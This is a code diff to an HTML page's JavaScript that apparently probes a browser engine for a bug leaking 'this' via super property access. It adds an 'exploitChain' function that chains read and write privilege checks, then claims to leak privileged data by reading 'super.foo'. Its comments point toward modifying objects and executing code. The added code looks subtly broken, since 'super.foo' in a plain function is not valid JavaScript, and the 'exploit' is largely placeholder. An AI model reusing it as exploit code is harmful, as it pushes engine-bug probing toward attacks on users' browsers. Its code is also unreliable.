@@ -112,6 +112,28 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
+    // We can combine read and write check results into an exploit chain.
+    function exploitChain() {
+        const readSuccess = checkReadPrivilege();
+        log(`Read privilege check: ${readSuccess ? "SUCCESS" : "FAILED"}`);
+
+        if (readSuccess) {
+            const writeSuccess = checkWritePrivilege();
+            log(`Write privilege check: ${writeSuccess ? "SUCCESS" : "FAILED"}`);
+
+            if (writeSuccess) {
+                // If both read and write privileges are granted, we can proceed with more dangerous actions.
+                log("Exploiting privileges to leak data...");
+                // Example of leaking something sensitive (in this case, 'foo' or any privileged data)
+                let leakedData = super.foo;
+                log(`Leaked data: ${leakedData}`);
+
+                // More exploit steps could go here, such as:
+                // Modifying objects, triggering side effects, executing code
+            }
+        }
+    }
+
     function tryToLeakThisViaGetById() {
         let foo = 42;
         class Leaker {
@@ -232,11 +254,8 @@ document.addEventListener('DOMContentLoaded', function () {
             const result4 = tryToLeakThisViaSetByVal();
             log(`tryToLeakThisViaSetByVal: ${result4}`);
 
-            const readSuccess = checkReadPrivilege();
-            log(`Read privilege check: ${readSuccess ? "SUCCESS" : "FAILED"}`);
-
-            const writeSuccess = checkWritePrivilege();
-            log(`Write privilege check: ${writeSuccess ? "SUCCESS" : "FAILED"}`);
+            // Check for read and write privileges and exploit them
+            exploitChain();
 
             if (i % 10 === 0) {
                 log(`Iteration ${i} completed successfully.`);
@@ -256,3 +275,4 @@ document.addEventListener('DOMContentLoaded', function () {
 
 </body>
 </html>
+
